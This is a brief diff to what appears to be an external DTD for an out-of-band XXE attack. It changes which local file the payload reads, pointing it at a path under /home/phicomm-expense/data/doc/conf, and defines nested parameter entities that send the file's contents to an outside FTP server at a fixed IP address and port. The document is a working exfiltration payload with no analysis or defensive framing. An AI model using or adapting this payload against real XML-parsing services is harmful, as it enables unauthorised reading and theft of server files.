@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///home/phicomm-expense/data/doc"> 
+<!ENTITY % file SYSTEM "file:///home/phicomm-expense/data/doc/conf"> 
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://176.122.168.149:333/%file;'>"> 
 %int; 
 %send; 
